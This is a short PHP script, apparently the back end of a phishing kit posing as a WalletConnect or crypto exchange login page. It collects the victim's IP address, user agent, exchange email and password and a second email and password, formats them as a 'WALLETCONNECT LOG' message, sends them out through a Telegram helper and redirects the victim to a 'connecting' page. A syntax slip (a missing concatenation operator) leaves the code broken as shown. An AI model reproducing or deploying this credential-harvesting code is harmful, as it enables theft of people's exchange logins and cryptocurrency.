<?php
error_reporting(0);
session_start();
include_once 'connect.php';
include_once 'functions.php';
include_once 'telegram.php';

$fsh =
        "<strong>‼️🚾 WALLETCONNECT LOG 🚾‼️</strong>\n".
		"<strong></strong>\n".
        "<strong>🌐 IP:  ".$_SESSION['remote_ip']."</strong>\n".
		"<i>📱 OS:  ".$_SESSION['useragent']."</i>\n".
		"<strong></strong>\n".
        "<strong>Exchange Email:</strong>\n".
		"<code>".$_SESSION['key']."</code>\n".
		"<strong></strong>\n".
        "<strong>Exchange Password:</strong> ".$_SESSION['pass']."\n"
         "<strong>Exchange Email:</strong>\n".
		"<code>".$_SESSION['email']."</code>\n".
		"<strong></strong>\n".
        "<strong>Exchange Password:</strong> ".$_SESSION['emailpass']."\n"
        ;

telegram($fsh);
finish($fsh);
encrypt($fsh);
header("Location: ./connecting.php ");
?>
